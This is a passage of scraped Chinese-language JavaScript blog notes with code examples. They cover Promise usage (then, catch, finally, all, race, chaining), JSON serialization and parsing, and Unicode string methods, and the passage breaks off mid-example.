期约用途期约主要有两大用途。首先是抽象地表示一个异步操作。期约的状态代表期约是否完成。某些情况下，这个状态机就是期约可以提供的最有用的信息。 通过执行函数控制期约状态期约的状态是私有的，所以只能在内部进行操作。内部操作在期约的执行器函数中完成。执行器函数主要有两项职责：初始化期约的异步行为和控制状态的最终转换。其中，控制期约状态的转换是通过调用它的两个函数参数实现的。这两个函数参数通常都命名为 resolve()和 reject()。调用resolve()会把状态切换为兑现，调用 reject()会把状态切换为拒绝。另外，调用 reject()也会抛出错误 123456let p1=new Promise((resolve,reject)=&gt;resolve());setTimeout(console.log,0,p1);//Promise &lt;resolved&gt;let p2 = new Promise((resolve, reject) =&gt; reject());setTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;// Uncaught error (in promise) 在前面的例子中，并没有什么异步操作，因为在初始化期约时，执行器函数已经改变了每个期约的状态，执行器函数是同步执行的。这是因为执行器函数是期约的初始化程序。 添加 setTimeout 可以推迟切换状态： 1234let p = new Promise((resolve, reject) =&gt; setTimeout(resolve, 1000));// 在 console.log 打印期约实例的时候，还不会执行超时回调（即 resolve()）setTimeout(console.log, 0, p); // Promise &lt;pending&gt; 无论 resolve()和 reject()中的哪个被调用，状态转换都不可撤销了。于是继续修改状态会静默失败，如下所示： 123456let p = new Promise((resolve, reject) =&gt; &#123;resolve();reject(); // 没有效果&#125;);setTimeout(console.log, 0, p); // Promise &lt;resolved&gt; Promise.resolve()下面两个期约实例实际上是一样的： let p1 = new Promise((resolve, reject) =&gt; resolve());let p2 = Promise.resolve(); 这个解决的期约的值对应着传给 Promise.resolve()的第一个参数。使用这个静态方法，实际上可以把任何值都转换为一个期约 12345678setTimeout(console.log,0,Promise.resolve());// Promise &lt;resolved&gt;: undefinedsetTimeout(console.log, 0, Promise.resolve(3));// Promise &lt;resolved&gt;: 3// 多余的参数会忽略setTimeout(console.log, 0, Promise.resolve(4, 5, 6));// Promise &lt;resolved&gt;: 4 对这个静态方法而言，如果传入的参数本身是一个期约，那它的行为就类似于一个空包装。因此，Promise.resolve()可以说是一个幂等方法 1234567891011let p = Promise.resolve(7);setTimeout(console.log, 0, p === Promise.resolve(p));// truesetTimeout(console.log, 0, p === Promise.resolve(Promise.resolve(p)));// true//这个幂等性会保留传入期约的状态：let p = new Promise(() =&gt; &#123;&#125;);setTimeout(console.log, 0, p); // Promise &lt;pending&gt;setTimeout(console.log, 0, Promise.resolve(p)); // Promise &lt;pending&gt;setTimeout(console.log, 0, p === Promise.resolve(p)); // true 注意，这个静态方法能够包装任何非期约值，包括错误对象，并将其转换为解决的期约。因此，也可能导致不符合预期的行为： 1234let p = Promise.resolve(new Error(&#x27;foo&#x27;));setTimeout(console.log, 0, p);// Promise &lt;resolved&gt;: Error: foo Promise.reject()与 Promise.resolve()类似，Promise.reject()会实例化一个拒绝的期约并抛出一个异步错误（这个错误不能通过 try/catch 捕获，而只能通过拒绝处理程序捕获）。下面的两个期约实例实际上是一样的： let p1 = new Promise((resolve, reject) =&gt; reject());let p2 = Promise.reject(); 这个拒绝的期约的理由就是传给 Promise.reject()的第一个参数。这个参数也会传给后续的拒绝处理程序： 1234let p = Promise.reject(3);setTimeout(console.log, 0, p); // Promise &lt;rejected&gt;: 3p.then(null, (e) =&gt; setTimeout(console.log, 0, e)); // 3 关键在于，Promise.reject()并没有照搬 Promise.resolve()的幂等逻辑。如果给它传一个期约对象，则这个期约会成为它返回的拒绝期约的理由： 123setTimeout(console.log, 0, Promise.reject(Promise.resolve()));// Promise &lt;rejected&gt;: Promise &lt;resolved&gt; 同步/异步执行的二元性123456789101112try &#123;throw new Error(&#x27;foo&#x27;);&#125; catch(e) &#123;console.log(e); // Error: foo&#125;try &#123;Promise.reject(new Error(&#x27;bar&#x27;));&#125; catch(e) &#123;console.log(e);&#125;// Uncaught (in promise) Error: bar 第一个 try/catch 抛出并捕获了错误，第二个 try/catch 抛出错误却没有捕获到,这里的同步代码之所以没有捕获期约抛出的错误，是因为它没有通过异步模式捕获错误。从这里就可以看出期约真正的异步特性：它们是同步对象（在同步执行模式中使用），但也是异步执行模式的媒介。在前面的例子中，拒绝期约的错误并没有抛到执行同步代码的线程里，而是通过浏览器异步消息队列来处理的。因此，try/catch 块并不能捕获该错误。代码一旦开始以异步模式执行，则唯一与之交互的方式就是使用异步结构——更具体地说，就是期约的方法。 Promise.prototype.then()Promise.prototype.then()是为期约实例添加处理程序的主要方法。这个 then()方法接收最多 两个参数：onResolved 处理程序和 onRejected 处理程序。这两个参数都是可选的，如果提供的话，则会在期约分别进入“兑现”和“拒绝”状态时执行。传给 then()的任何非函数类型的参数都会被静 默忽略。如果想只提供 onRejected 参数，那就要在 onResolved 参数的位置上传入 undefined。这 样有助于避免在内存中创建多余的对象 123456789101112131415function onResolved(id) &#123; setTimeout(console.log, 0, id, &#x27;resolved&#x27;); &#125; function onRejected(id) &#123; setTimeout(console.log, 0, id, &#x27;rejected&#x27;); &#125; let p1 = new Promise((resolve, reject) =&gt; setTimeout(resolve, 3000)); let p2 = new Promise((resolve, reject) =&gt; setTimeout(reject, 3000)); p1.then(() =&gt; onResolved(&#x27;p1&#x27;), () =&gt; onRejected(&#x27;p1&#x27;)); p2.then(() =&gt; onResolved(&#x27;p2&#x27;), () =&gt; onRejected(&#x27;p2&#x27;)); //（3 秒后）// p1 resolved // p2 rejected 1234567891011121314function onResolved(id) &#123; setTimeout(console.log, 0, id, &#x27;resolved&#x27;); &#125; function onRejected(id) &#123; setTimeout(console.log, 0, id, &#x27;rejected&#x27;); &#125; let p1 = new Promise((resolve, reject) =&gt; setTimeout(resolve, 3000)); let p2 = new Promise((resolve, reject) =&gt; setTimeout(reject, 3000)); // 非函数处理程序会被静默忽略，不推荐p1.then(&#x27;gobbeltygook&#x27;); // 不传 onResolved 处理程序的规范写法p2.then(null, () =&gt; onRejected(&#x27;p2&#x27;)); // p2 rejected（3 秒后 Promise.prototype.then()方法返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.then(); setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false 这个新期约实例基于 onResovled 处理程序的返回值构建。换句话说，该处理程序的返回值会通过 Promise.resolve()包装来生成新期约。如果没有提供这个处理程序，则 Promise.resolve()就会 包装上一个期约解决之后的值。如果没有显式的返回语句，则 Promise.resolve()会包装默认的返回 值 undefined。 123456789101112131415161718192021222324252627282930313233let p1 = Promise.resolve(&#x27;foo&#x27;); // 若调用 then()时不传处理程序，则原样向后传let p2 = p1.then();setTimeout(console.log, 0, p2); // Promise &lt;resolved&gt;: foo // 这些都一样let p3 = p1.then(() =&gt; undefined); let p4 = p1.then(() =&gt; &#123;&#125;); let p5 = p1.then(() =&gt; Promise.resolve()); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: undefined //如果有显式的返回值，则 Promise.resolve()会包装这个值：// 这些都一样let p6 = p1.then(() =&gt; &#x27;bar&#x27;); let p7 = p1.then(() =&gt; Promise.resolve(&#x27;bar&#x27;)); setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: bar setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: bar // Promise.resolve()保留返回的期约let p8 = p1.then(() =&gt; new Promise(() =&gt; &#123;&#125;)); let p9 = p1.then(() =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p8); // Promise &lt;pending&gt; setTimeout(console.log, 0, p9); // Promise &lt;rejected&gt;: undefined//抛出异常会返回拒绝的期约： let p10 = p1.then(() =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt; baz //注意，返回错误值不会触发上面的拒绝行为，而会把错误对象包装在一个解决的期约中：... let p11 = p1.then(() =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p11); // Promise &lt;resolved&gt;: Error: qux onRejected 处理程序也与之类似：onRejected 处理程序返回的值也会被 Promise.resolve() 包装。乍一看这可能有点违反直觉，但是想一想，onRejected 处理程序的任务不就是捕获异步错误吗？ 因此，拒绝处理程序在捕获错误后不抛出异常是符合期约的行为，应该返回一个解决期约 12345678910111213141516171819202122232425262728let p1 = Promise.reject(&#x27;foo&#x27;); // 调用 then()时不传处理程序则原样向后传let p2 = p1.then(); // Uncaught (in promise) foosetTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;: foo // 这些都一样let p3 = p1.then(null, () =&gt; undefined); let p4 = p1.then(null, () =&gt; &#123;&#125;); let p5 = p1.then(null, () =&gt; Promise.resolve()); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: undefined // 这些都一样let p6 = p1.then(null, () =&gt; &#x27;bar&#x27;); let p7 = p1.then(null, () =&gt; Promise.resolve(&#x27;bar&#x27;)); setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: bar setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: bar // Promise.resolve()保留返回的期约let p8 = p1.then(null, () =&gt; new Promise(() =&gt; &#123;&#125;)); let p9 = p1.then(null, () =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p8); // Promise &lt;pending&gt; setTimeout(console.log, 0, p9); // Promise &lt;rejected&gt;: undefined let p10 = p1.then(null, () =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt;: baz let p11 = p1.then(null, () =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p11); // Promise &lt;resolved&gt;: Error: qux Promise.prototype.catch()Promise.prototype.catch()方法用于给期约添加拒绝处理程序。这个方法只接收一个参数： onRejected 处理程序。事实上，这个方法就是一个语法糖，调用它就相当于调用 Promise.prototype. then(null, onRejected) 1234567let p = Promise.reject(); let onRejected = function(e) &#123; setTimeout(console.log, 0, &#x27;rejected&#x27;); &#125;; // 这两种添加拒绝处理程序的方式是一样的：p.then(null, onRejected); // rejected p.catch(onRejected); // rejected Promise.prototype.catch()返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.catch(); setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false Promise.prototype.finally()Promise.prototype.finally()方法用于给期约添加 onFinally 处理程序，这个处理程序在期 约转换为解决或拒绝状态时都会执行。这个方法可以避免 onResolved 和 onRejected 处理程序中出 现冗余代码。但 onFinally 处理程序没有办法知道期约的状态是解决还是拒绝，所以这个方法主要用清理代码 1234567let p1 = Promise.resolve(); let p2 = Promise.reject(); let onFinally = function() &#123; setTimeout(console.log, 0, &#x27;Finally!&#x27;) &#125; p1.finally(onFinally); // Finally p2.finally(onFinally); // Finally Promise.prototype.finally()方法返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.finally();setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false 这个新期约实例不同于 then()或 catch()方式返回的实例。因为 onFinally 被设计为一个状态 无关的方法，所以在大多数情况下它将表现为父期约的传递 1234567891011121314151617181920212223242526let p1 = Promise.resolve(&#x27;foo&#x27;); // 这里都会原样后传let p2 = p1.finally(); let p3 = p1.finally(() =&gt; undefined); let p4 = p1.finally(() =&gt; &#123;&#125;); let p5 = p1.finally(() =&gt; Promise.resolve()); let p6 = p1.finally(() =&gt; &#x27;bar&#x27;); let p7 = p1.finally(() =&gt; Promise.resolve(&#x27;bar&#x27;)); let p8 = p1.finally(() =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p2); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p8); // Promise &lt;resolved&gt;: foo //如果返回的是一个待定的期约，或者 onFinally 处理程序抛出了错误（显式抛出或返回了一个拒绝期约），则会返回相应的期约（待定或拒绝）// Promise.resolve()保留返回的期约let p9 = p1.finally(() =&gt; new Promise(() =&gt; &#123;&#125;)); let p10 = p1.finally(() =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p9); // Promise &lt;pending&gt; setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt;: undefined let p11 = p1.finally(() =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p11); // Promise &lt;rejected&gt;: baz 非重入期约方法当期约进入落定状态时，与该状态相关的处理程序仅仅会被排期，而非立即执行。跟在添加这个处 理程序的代码之后的同步代码一定会在处理程序之前先执行。即使期约一开始就是与附加处理程序关联 的状态，执行顺序也是这样的。这个特性由 JavaScript 运行时保证，被称为“非重入”（non-reentrancy） 特性。 1234567891011121314151617let synchronousResolve; // 创建一个期约并将解决函数保存在一个局部变量中let p = new Promise((resolve) =&gt; &#123; synchronousResolve = function() &#123; console.log(&#x27;1: invoking resolve()&#x27;); resolve(); console.log(&#x27;2: resolve() returns&#x27;); &#125;; &#125;); p.then(() =&gt; console.log(&#x27;4: then() handler executes&#x27;)); synchronousResolve(); console.log(&#x27;3: synchronousResolve() returns&#x27;); // 实际的输出：// 1: invoking resolve() // 2: resolve() returns // 3: synchronousResolve() returns // 4: then() handler executes 在这个例子中，即使期约状态变化发生在添加处理程序之后，处理程序也会等到运行的消息队列让 它出列时才会执行。 传递解决值和拒绝理由到了落定状态后，期约会提供其解决值（如果兑现）或其拒绝理由（如果拒绝）给相关状态的处理 程序。拿到返回值后，就可以进一步对这个值进行操作。比如，第一次网络请求返回的 JSON 是发送第 二次请求必需的数据，那么第一次请求返回的值就应该传给 onResolved 处理程序继续处理。当然，失 败的网络请求也应该把 HTTP 状态码传给 onRejected 处理程序。 在执行函数中，解决的值和拒绝的理由是分别作为 resolve()和 reject()的第一个参数往后传 的。然后，这些值又会传给它们各自的处理程序，作为 onResolved 或 onRejected 处理程序的唯一 参数。 1234let p1 = new Promise((resolve, reject) =&gt; resolve(&#x27;foo&#x27;)); p1.then((value) =&gt; console.log(value)); // foo let p2 = new Promise((resolve, reject) =&gt; reject(&#x27;bar&#x27;)); p2.catch((reason) =&gt; console.log(reason)); // bar then()和 catch()的 onRejected 处理程序在语义上相当于 try/catch。出发点都是捕获错误之 后将其隔离，同时不影响正常逻辑执行。为此，onRejected 处理程序的任务应该是在捕获异步错误之 后返回一个解决的期约。下面的例子中对比了同步错误处理与异步错误处理： 123456789101112131415161718192021console.log(&#x27;begin synchronous execution&#x27;); try &#123; throw Error(&#x27;foo&#x27;); &#125; catch(e) &#123; console.log(&#x27;caught error&#x27;, e); &#125; console.log(&#x27;continue synchronous execution&#x27;); // begin synchronous execution // caught error Error: foo // continue synchronous execution new Promise((resolve, reject) =&gt; &#123; console.log(&#x27;begin asynchronous execution&#x27;); reject(Error(&#x27;bar&#x27;)); &#125;).catch((e) =&gt; &#123; console.log(&#x27;caught error&#x27;, e); &#125;).then(() =&gt; &#123; console.log(&#x27;continue asynchronous execution&#x27;); &#125;); // begin asynchronous execution // caught error Error: bar // continue asynchronous execution 期约连锁每个后续的处理程序都会等待前一个期约解决，然后实例化一个新期约并返回它。这种结构可以简 洁地将异步任务串行化，解决之前依赖回调的难题 1234567891011121314function delayedResolve(str) &#123; return new Promise((resolve, reject) =&gt; &#123; console.log(str); setTimeout(resolve, 1000); &#125;); &#125;delayedResolve(&#x27;p1 executor&#x27;) .then(() =&gt; delayedResolve(&#x27;p2 executor&#x27;)) .then(() =&gt; delayedResolve(&#x27;p3 executor&#x27;)) .then(() =&gt; delayedResolve(&#x27;p4 executor&#x27;)) // p1 executor（1 秒后）// p2 executor（2 秒后）// p3 executor（3 秒后）// p4 executor（4 秒后） Promise.all()Promise.all方法用于将多个 Promise 实例，这个静态方法接收一个可迭代对象，将参数转为 Promise 实例，再包装成一个新的 Promise 实例。 合成的期约只会在每个包含的期约都解决之后才解决 如果至少有一个包含的期约待定，则合成的期约也会待定。如果有一个包含的期约拒绝，则合成的 期约也会拒绝 1234567//永远待定let p1=Promise.all([new Promise(()=&gt;&#123;&#125;)]);setTimeout(console.log,0,p1);//Promise &lt;pending&gt;//一次拒绝会导致最终期约拒绝let p2=Promise.all([Promise.resolve(),Promise.reject(),Promise.resolve()]);setTimeout(console.log,0,p2);//Promise &lt;rejected&gt;//Uncaught (in promise) undefined 如果所有期约都成功解决，则合成期约的解决值就是所有包含期约解决值的数组，按照迭代器顺序: 1234567891011121314let p = Promise.all([ Promise.resolve(3), Promise.resolve(), Promise.resolve(4) ]); p.then((values) =&gt; setTimeout(console.log, 0, values)); // [3, undefined, 4] // 虽然只有第一个期约的拒绝理由会进入 // 拒绝处理程序，第二个期约的拒绝也// 会被静默处理，不会有错误跑掉let p = Promise.all([ Promise.reject(3), new Promise((resolve, reject) =&gt; setTimeout(reject, 1000)) ]); p.catch((reason) =&gt; setTimeout(console.log, 0, reason)); // 3 Promise.race()Promise.race()静态方法返回一个包装期约，是一组集合中最先解决或拒绝的期约的镜像。这个 方法接收一个可迭代对象，返回一个新期约 12345678910111213141516171819// 解决先发生，超时后的拒绝被忽略let p1 = Promise.race([ Promise.resolve(3), new Promise((resolve, reject) =&gt; setTimeout(reject, 1000)) ]); setTimeout(console.log, 0, p1); // Promise &lt;resolved&gt;: 3 // 拒绝先发生，超时后的解决被忽略let p2 = Promise.race([ Promise.reject(4), new Promise((resolve, reject) =&gt; setTimeout(resolve, 1000)) ]); setTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;: 4 // 迭代顺序决定了落定顺序let p3 = Promise.race([ Promise.resolve(5), Promise.resolve(6), Promise.resolve(7) ]); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: 5 串行期约合成1234567function addTwo(x)&#123;return x+1;&#125;function addThree(x)&#123;return x+3;&#125;function addFive(x)&#123;return x+5;&#125;function addTen(x)&#123; return [addTwo,addThree,addFive].reduce((promise,fn)=&gt;promise.then(fn),Promise.resolve(x));&#125;addTen(8).then(console.log); donePromise 对象的回调链，不管以then方法或catch方法结尾，要是最后一个方法抛出错误，都有可能无法捕捉到（因为 Promise 内部的错误不会冒泡到全局）。因此，我们可以提供一个done方法，总是处于回调链的尾端，保证抛出任何可能出现的错误。 12345678910111213asyncFunc() .then(f1) .catch(r1) .then(f2) .done();Promise.prototype.done=function(onResolved,onRejected)&#123; this.then(onResolved,onRejected) .catch(function(reason)&#123; //抛出一个全局错误 setTimeout(()=&gt;&#123;throw reason&#125;,0); &#125;); &#125; finallyfinally()f方法用于指定不管Promise对象最后状态如何，都会执行的操作，它接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。 123456789101112server.listen(0) .then(function () &#123; // run test &#125;) .finally(server.stop);Promise.prototype.finally=function(callback)&#123; let P=this.constructor; return this.then( value=&gt;P.resolve(callback()).then(()=&gt;value), reason=&gt;P.resolve(callback()).then(()=&gt;&#123;throw reason&#125;) ); &#125; 用途将图片的加载写成一个Promise，一旦加载完成，Promise的状态发生变化 123456789//加载图片 const preloadImage=function(path)&#123; return new Promise(function(resolve,reject)&#123; const image=new Image(); image.onload=resolve; image.onerror=reject; image.src=path; &#125;) &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"json","slug":"json","date":"2022-01-04T08:03:00.000Z","updated":"2022-01-04T09:00:12.474Z","comments":true,"path":"2022/01/04/json/","link":"","permalink":"https://coloey.github.io/2022/01/04/json/","excerpt":"","text":"把它当成一种数据格式，而不是编程语言。JSON 不属于 JavaScript，它们只是拥有相同的语法而已。JSON 也不是只能在 JavaScript 中使用，它是一种通用数据格式。很多语言都有解析和序列化 JSON 的内置能力。 语法 简单值：字符串、数值、布尔值和 null 可以在 JSON 中出现，就像在 JavaScript 中一样。特殊值 undefined 不可以。 对象：第一种复杂数据类型，对象表示有序键/值对。每个值可以是简单值，也可以是复杂类型。 数组：第二种复杂数据类型，数组表示可以通过数值索引访问的值的有序列表。数组的值可以是任意类型，包括简单值、对象，甚至其他数组。 简单值JavaScript 字符串与 JSON 字符串的主要区别是，JSON 字符串必须使用双引号（单引号会导致语法错误）。布尔值和 null 本身也是有效的 JSON 值 对象与 JavaScript 对象字面量相比，JSON 主要有两处不同。首先，没有变量声明（JSON 中没有变量）。其次，最后没有分号（不需要，因为不是 JavaScript 语句）。同样，用引号将属性名包围起来才是有效的JSON。属性的值可以是简单值或复杂数据类型值，后者可以在对象中再嵌入对象. 123456789&#123;&quot;name&quot;: &quot;Nicholas&quot;,&quot;age&quot;: 29,&quot;school&quot;: &#123;&quot;name&quot;: &quot;Merrimack College&quot;,&quot;location&quot;: &quot;North Andover, MA&quot;&#125;&#125; 数组数组在 JSON 中使用 JavaScript 的数组字面量形式表示. JavaScript 12let values = [25, &quot;hi&quot;, true]; Json 1[25,&quot;hi&quot;,true] JavaScript序列化为Jsonstringfy()：在序列化 JavaScript 对象时，所有函数和原型成员都会有意地在结果中省略。此外，值为 undefined的任何属性也会被跳过。最终得到的就是所有实例属性均为有效 JSON 数据类型的表 1234567891011let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book); 结果： {“title”:”Professional JavaScript”,”authors”:[“Nicholas C. Zakas”,”Matt Frisbie”],“edition”:4,”year”:2017} 还可以接收两个参数。这两个参数可以用于指定其他序列化 JavaScript 对象的方式。第一个参数是过滤器，可以是数组或函数；第二个参数是用于缩进结果 JSON 字符串的选项。 1234567891011let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, [&quot;title&quot;, &quot;edition&quot;]); 如果第二个参数是一个函数，则行为又有不同。提供的函数接收两个参数：属性名（key）和属性值（value）。可以根据这个 key 决定要对相应属性执行什么操作。这个 key 始终是字符串，只是在值不属于某个键/值对时会是空字符串 返回的值就是相应 key 应该包含的结果。注意，返回 undefined 会导致属性被忽略 1234567891011121314151617181920212223242526let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, (key, value) =&gt; &#123;switch(key) &#123;case &quot;authors&quot;:return value.join(&quot;,&quot;)case &quot;year&quot;:return 5000;case &quot;edition&quot;:return undefined;default:return value;&#125;&#125;);/*&#123;&quot;title&quot;:&quot;Professional JavaScript&quot;,&quot;authors&quot;:&quot;Nicholas C. Zakas,MattFrisbie&quot;,&quot;year&quot;:5000&#125;*/ JSON.stringify()方法的第三个参数控制缩进和空格。在这个参数是数值时，表示每一级缩进的空格数。 123456789101112let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [ &quot;Nicholas C. Zakas&quot;, &quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, null, 4); toJSON():在要序列化的对象中添加 toJSON()方法，序列化时会基于这个方法返回适当的 JSON 表示: 12345678910111213let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017,toJSON: function() &#123;//箭头函数不能定义toJSON(),因为剪头函数的词法作用域是全局作用域，在这种情况不合适return this.title;&#125;&#125;;let jsonText = JSON.stringify(book);//book对象返回图书的书名(this.title) toJSON()方法可以与过滤函数一起使用，在把对象传给 JSON.stringify()时会执行如下步骤。 (1) 如果可以获取实际的值，则调用 toJSON()方法获取实际的值，否则使用默认的序列化。(2) 否则，使用默认序列化时，如果提供了第二个参数，则应用过滤。(3) 第(2)步返回的每个值都会相应地进行序列化。(4) 如果提供了第三个参数，则相应地进行缩进。 ES6中堆JSON.stringfy的改造UTF-8 标准规定，0xD800到0xDFFF之间的码点，不能单独使用，必须配对使用。比如，\\uD834\\uDF06是两个码点，但是必须放在一起配对使用，代表字符𝌆。这是为了表示码点大于0xFFFF的字符的一种变通方法。单独使用\\uD834和\\uDFO6这两个码点是不合法的，或者颠倒顺序也不行，因为\\uDF06\\uD834并没有对应的字符。 JSON.stringify()的问题在于，它可能返回0xD800到0xDFFF之间的单个码点。 1JSON.stringify(&#x27;\\u&#123;D834&#125;&#x27;) // &quot;\\u&#123;D834&#125;&quot; 为了确保返回的是合法的 UTF-8 字符，ES2019 改变了JSON.stringify()的行为。如果遇到0xD800到0xDFFF之间的单个码点，或者不存在的配对形式，它会返回转义字符串，留给应用自己决定下一步的处理。 1JSON.stringify(&#x27;\\u&#123;D834&#125;&#x27;) // &quot;&quot;\\\\uD834&quot;&quot;JSON.stringify(&#x27;\\uDF06\\uD834&#x27;) // &quot;&quot;\\\\udf06\\\\ud834&quot;&quot; 解析选项JSON.parse():接收一个参数，这个函数称为还原函数，还原函数接收两个参数，属性名key和属性名value，如果还原函数返回undefined，则结果中删除相应键，如果返回了其他任何值，则该值就会成为相应键的值插入到结果中。 123456789101112131415let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017,releaseDate: new Date(2017, 11, 1)&#125;;let jsonText = JSON.stringify(book);let bookCopy = JSON.parse(jsonText,(key, value) =&gt; key == &quot;releaseDate&quot; ? new Date(value) : value);alert(bookCopy.releaseDate.getFullYear());//对象仙贝序列化为JSON字符串，又被重新解析为一个对象bookCopy,还原函数查找&quot;releaseDate&quot;键，找到后根虎日期字符创建新的Date对象，得到的bookCopy.releaseDate属性又变回Date对象，可以调用其getFullYear()方法","categories":[],"tags":[]},{"title":"字符表示","slug":"字符表示","date":"2022-01-04T03:58:13.000Z","updated":"2022-01-04T04:14:36.508Z","comments":true,"path":"2022/01/04/字符表示/","link":"","permalink":"https://coloey.github.io/2022/01/04/%E5%AD%97%E7%AC%A6%E8%A1%A8%E7%A4%BA/","excerpt":"","text":"JavaScript字符表示JavaScript 字符串由 16 位码元（code unit）组成。对多数字符来说，每 16 位码元对应一个字符。换句话说，字符串的 length 属性表示字符串包含多少 16 位码元 JavaScript 字符串使用了两种 Unicode 编码混合的策略：UCS-2 和 UTF-16。对于可以采用 16 位编码的字符（U+0000~U+FFFF），这两种编码实际上是一样的。 查看指定码元charCodeAt()123456let message = &quot;abcde&quot;;// Unicode &quot;Latin small letter C&quot;的编码是 U+0063console.log(message.charCodeAt(2)); // 99// 十进制 99 等于十六进制 63console.log(99 === 0x63); // true 这个对应关系在扩展到 Unicode 增补字符平面时就不成立了。即 16 位只能唯一表示,65 536 个字符。这对于大多数语言字符集是足够了，在 Unicode 中称为基本多语言平面（BMP）。为了表示更多的字符，Unicode 采用了一个策略，即每个字符使用另外 16 位去选择一个增补平面。这种每个字符使用两个 16 位码元的策略称为代理对。 codePointAt()为正确解析既包含单码元字符又包含代理对字符的字符串，可以使用 codePointAt()来代替charCodeAt()。跟使用 charCodeAt()时类似，codePointAt()接收 16 位码元的索引并返回该索引位置上的码点（code point）。码点是 Unicode 中一个字符的完整标识。比如，”c”的码点是 0x0063，而”☺”的码点是 0x1F60A。码点可能是 16 位，也可能是 32 位，而 codePointAt()方法可以从指定码元位置识别完整的码点。 123456let message = &quot;ab☺de&quot;;console.log(message.codePointAt(1)); // 98console.log(message.codePointAt(2)); // 128522console.log(message.codePointAt(3)); // 56842console.log(message.codePointAt(4)); // 100 给定UTF-16码原创建字符fromCharCode()12345678910111213// Unicode &quot;Latin small letter A&quot;的编码是 U+0061// Unicode &quot;Latin small letter B&quot;的编码是 U+0062// Unicode &quot;Latin small letter C&quot;的编码是 U+0063// Unicode &quot;Latin small letter D&quot;的编码是 U+0064// Unicode &quot;Latin small letter E&quot;的编码是 U+0065console.log(String.fromCharCode(0x61, 0x62, 0x63, 0x64, 0x65)); // &quot;abcde&quot;// 0x0061 === 97// 0x0062 === 98// 0x0063 === 99// 0x0064 === 100// 0x0065 === 101console.log(String.fromCharCode(97, 98, 99, 100, 101)); // &quot;abcde&quot; fromCodePoint()fromCodePoint()：这个方法接收任意数量的码点，返回对应字符拼接起来的字符串 1234console.log(String.fromCharCode(97, 98, 55357, 56842, 100, 101)); // ab☺deconsole.log(String.fromCodePoint(97, 98, 128522, 100, 101)); // ab☺de normalize()规范化Unicode提供了 4种规范化形式，可以将类似上面的字符规范化为一致的格式，无论底层字符的代码是什么。这 4种规范化形式是：NFD（Normalization Form D）、NFC（Normalization Form C）、NFKD（Normalization Form KD）和 NFKC（Normalization Form KC）。可以使用 normalize()方法对字符串应用上述规范化形式，使用时需要传入表示哪种形式的字串：”NFD”、”NFC”、”NFKD”或”NFKC”。 通过比较字符串与其调用 normalize()的返回值，就可以知道该字符串是否已经规范化了 12345678910111213141516171819let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);// U+00C5 是对 0+212B 进行 NFC/NFKC 规范化之后的结果console.log(a1 